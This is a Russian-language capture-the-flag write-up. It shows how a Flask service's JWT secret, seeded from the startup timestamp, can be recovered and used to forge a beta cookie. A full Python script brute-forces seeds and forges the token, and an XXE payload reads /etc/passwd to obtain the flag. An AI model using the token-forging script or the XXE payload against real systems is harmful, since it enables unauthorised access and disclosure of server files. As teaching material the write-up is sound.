# pretty

Смотрим исходники, замечаем интересный путь /pretty_xml:
```python
@app.route("/pretty_xml", methods=["GET", "POST"])
@is_beta_allowed
@increase_counter(REQUESTS_COUNTER)
@ip_stats_mw(ip_stats_lock, ip_stats)
def pretty_xml():
    pretty_format = "XML"
    post_url = url_for('pretty_xml')

    if request.method == "POST":
        ugly_data = ""
        pretty_data = ""
        try:
            ugly_data = request.form.get("ugly_data")

            root = etree.fromstring(ugly_data)
            etree.indent(root, space="  ", level=0)
            pretty_data = etree.tostring(root, encoding='unicode')
        except Exception as e:
            print(e)
            pretty_data = "Errors in ugly data, check formatting"
        finally:
            return render_template("pretty.html",
                                   pretty_format=pretty_format,
                                   post_url=post_url,
                                   ugly_data=ugly_data,
                                   pretty_data=pretty_data)

    return render_template("pretty.html", pretty_format=pretty_format, post_url=post_url)
```  
Путь доступен только бета юзерам, которые определяются с `@is_beta_allowed` декоратора:
```python
def is_beta_allowed(f):
    @functools.wraps(f)
    def wrapper(*args, **kwargs):
        cookies = request.cookies
        try:
            decoded = jwt.decode(cookies["bc"], secret, algorithms=["HS256"])
            if not decoded["is_beta"]:
                return f(*args, **kwargs)
        except (KeyError, DecodeError):
            return redirect(url_for("not_beta", view=request.path))

        return f(*args, **kwargs)

    return wrapper
```  
Декоратор проверяет jwt токен записанный в куки с названием 'bc', если токен подписан с помощью `secret`, то пропускает дальше, в нашем случае в `/pretty_xml`.  
Смотрим как генерируется `secret` в secret.py:  
```python
import datetime
import random
import string

random.seed(int(datetime.datetime.utcnow().timestamp()))
secret = ''.join([random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(32)])
```

Генерируется он достаточно просто, сначала устанавливается seed для генератора случайных чисел с помощью random.seed, в качестве сид числа берется unix timestamp времени в момент выполнения кода по UTC. Дальше формируется строка из 32 случайно выбранных символа.
Вспоминаем, что сервис отображает на время "стабильной работы" на главной странице, а значит мы можем посчитать, когда был запущен сервис и сгенерироован secret, узнав unix timestamp запуска сервиса, мы сможем повторить генерацию секрета с нужным сидом, после чего мы без проблем сможем создать нужный jwt токен и подставить его в куки 'bc'.  
Далее код, генерирующий нужный jwt токен:
```python
import datetime as dt
from uuid import uuid4
import requests as reqs
import string
import random

import jwt

url = "http://194.26.138.228:5000/pretty_xml"

stats_time = "19:05:54 26.10.23"
run_time = 3

s_datetime = dt.datetime.strptime(stats_time, "%H:%M:%S %d.%m.%y").replace(tzinfo=dt.timezone.utc).timestamp()
start_timestamp = int(s_datetime) - int(run_time)

for i in range(10):
    random.seed(start_timestamp)
    secret = ''.join(
        [random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(32)]
    )

    token = jwt.encode({"uid": str(uuid4()), "is_beta": True}, secret, algorithm="HS256")
    cookies = {
        "bc": token
    }

    resp = reqs.get(url, cookies=cookies)
    if "beta" not in resp.text:
        print("START_TIMESTAMP:", start_timestamp)
        print("SECRET:", secret)
        print("TOKEN:", token)
        break

    start_timestamp -= 1
```

Код делает 10 попыток с разными секретами, каждый раз уменьшая сид на 1, т.к. между генерацией секрета и запуском сервиса могло пройти пару секунд(в реальности интервал редко превышал 1 секунду).

Вывод кода выше(может у вас отличаться):
```commandline
START_TIMESTAMP: 1698347150
SECRET: 5r3BX9ptFC99ayj05WG1xyX04j43W1S4
TOKEN: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJmZGRlM2ZhNS03NmFkLTQwMWItOGJiNi0xNWZhYzA2NzMzMDUiLCJpc19iZXRhIjp0cnVlfQ.fRtVOdIT67IE0ZjnhvQVkUvoUXambnVeKInOecv_HZI
```

Подставляем токен в куки нашего браузера для удобства решения и получаем доступ к `/pretty_xml`.
Для чего же нам нужен был доступ к `/pretty_xml`? Хэндлер pretty_xml() содержит одну критическую уязвимость. При форматировании XML он дополнительно 'рендерит' его, что позволяет нам, например, подставить в итоговый XML любой файл хранящийся на сервере. Делается это с помощью вот такого пейлоада:  
```xml
<!DOCTYPE foo [  
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]><foo>&xxe;</foo>
```
Это пейлоад эксплуатирует [XXE](https://habr.com/ru/companies/vds/articles/454614/) уязвимость. Отправляем его, получаем флаг:    
<img src="images/writeup0.png" width="512"/>

Полный скрипт решающий таску можете найти в [solve.py](solve.py), в `stats_time` - подставьте строку времени с фронта сервиса, в `run_time` - целое число секунд "стабильной работы сервиса".  

`flag: surctf_secret_is_not_s3cret_if_u_kn0w_t1mestamp`
